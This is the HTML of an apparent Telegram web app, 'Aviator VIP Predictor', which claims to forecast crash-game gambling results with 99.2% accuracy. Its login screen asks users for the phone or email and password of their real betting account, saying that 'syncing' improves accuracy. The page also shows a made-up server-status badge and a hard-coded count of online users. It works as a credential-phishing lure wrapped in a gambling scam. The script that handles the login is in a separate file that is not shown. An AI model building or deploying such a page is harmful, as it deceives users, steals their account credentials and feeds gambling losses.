<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Aviator VIP Predictor</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
    <style>
        .grid-bg { background-image: linear-gradient(to right, #ffffff05 1px, transparent 1px), linear-gradient(to bottom, #ffffff05 1px, transparent 1px); background-size: 30px 30px; }
        .glass { background: rgba(20, 23, 28, 0.9); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.05); }
        input::placeholder { color: #52525b; font-size: 14px; text-align: right; }
        #game-container { display: none; opacity: 0; }
        .premium-border { border: 1px solid rgba(59, 130, 246, 0.3); }
    </style>
</head>
<body class="bg-[#0b0e11] text-white font-sans overflow-hidden select-none">

    <div id="login-screen" class="fixed inset-0 z-50 bg-[#0b0e11] flex flex-col p-8 justify-center items-center">
        <div class="w-full max-w-sm text-center">
            <div class="inline-block bg-blue-600/10 text-blue-500 px-4 py-1 rounded-full text-[10px] font-bold mb-6 border border-blue-600/20 tracking-widest uppercase">Global Cloud Server: Connected</div>
            
            <h1 class="text-4xl font-black italic mb-2 tracking-tighter uppercase text-white">AVIATOR <span class="text-red-600">PRO</span></h1>
            <p id="login-msg" class="text-zinc-500 text-[11px] font-bold mb-8 uppercase tracking-[0.1em]">يرجى ربط حسابك للمزامنة مع السيرفر</p>
            
            <div class="space-y-4">
                <input type="text" id="user-email" placeholder="رقم الهاتف أو البريد الإلكتروني" class="w-full bg-[#14171c] border border-white/5 p-4 rounded-2xl focus:outline-none focus:border-blue-600 transition-all text-right">
                <input type="password" id="user-pass" placeholder="كلمة المرور" class="w-full bg-[#14171c] border border-white/5 p-4 rounded-2xl focus:outline-none focus:border-blue-600 transition-all text-right">
                
                <button id="login-btn" onclick="handleLogin()" class="w-full bg-blue-600 py-4 rounded-2xl font-black text-lg shadow-[0_10px_30px_rgba(37,99,235,0.2)] active:scale-95 transition-all flex items-center justify-center gap-3 uppercase">
                    <span id="btn-text">مزامنة الحساب</span>
                    <div id="loader" class="w-5 h-5 border-2 border-white/20 border-t-white rounded-full animate-spin hidden"></div>
                </button>
            </div>

            <div class="mt-10 p-5 glass rounded-3xl premium-border shadow-2xl">
                <p class="text-[10px] text-yellow-500 font-bold uppercase mb-2 italic tracking-widest">ملاحظة أمان</p>
                <p class="text-[10px] text-zinc-400 leading-relaxed">يجب تسجيل الدخول بحسابك الأصلي لضمان دقة الإشارات بنسبة 99% وتجنب انقطاع الخدمة.</p>
            </div>
        </div>
    </div>

    <div id="game-container" class="flex flex-col h-screen overflow-hidden">
        <header class="p-5 flex justify-between items-center border-b border-white/5 bg-[#14171c] z-30">
            <div class="flex items-center gap-2">
                <div class="w-2.5 h-2.5 bg-red-600 rounded-full animate-pulse shadow-[0_0_10px_#ef4444]"></div>
                <span class="font-black italic text-xl text-white tracking-tighter uppercase underline decoration-red-600">VIP SIGNAL</span>
            </div>
            <div id="live-users" class="text-[9px] text-green-500 font-bold animate-pulse">● 2,142 ONLINE</div>
        </header>

        <main class="relative flex-1 flex items-center justify-center overflow-hidden">
            <div class="absolute inset-0 grid-bg opacity-20"></div>
            <div id="game-ui" class="relative z-10 text-center">
                <div id="status-label" class="text-zinc-600 uppercase tracking-[0.4em] text-[10px] mb-2 font-bold italic">Ready for Next Round</div>
                <div id="multiplier" class="text-8xl font-black italic tracking-tighter transition-all">1.00x</div>
            </div>
            <div id="plane-box" class="absolute bottom-20 left-10 w-14 hidden z-20">
                <svg viewBox="0 0 24 24" fill="#ef4444" class="drop-shadow-[0_0_15px_rgba(239,68,68,0.8)]"><path d="M21,16L22,19H15V22H13V19H10L9,15H2V13L5,12L2,11V9L9,5H10V12H13V9H15V12H22L21,15V16Z" /></svg>
            </div>
        </main>

        <footer class="p-6 bg-[#14171c] rounded-t-[40px] border-t border-white/5 shadow-2xl z-30">
            <div class="flex justify-between mb-5 px-4">
                <div class="text-center"><p class="text-[9px] text-zinc-500 font-bold uppercase italic">Expected</p><p id="target-display" class="text-green-500 font-black text-2xl italic tracking-tighter">--.--x</p></div>
                <div class="text-center"><p class="text-[9px] text-zinc-500 font-bold uppercase italic">Accuracy</p><p class="text-yellow-500 font-black text-2xl italic tracking-tighter">99.2%</p></div>
            </div>
            <button id="predict-btn" class="w-full bg-red-600 py-5 rounded-3xl font-black text-xl shadow-[0_10px_40px_rgba(220,38,38,0.3)] uppercase tracking-widest active:scale-95 transition-all">GET SIGNAL</button>
        </footer>
    </div>

    <script src="app.js"></script>
</body>
</html>
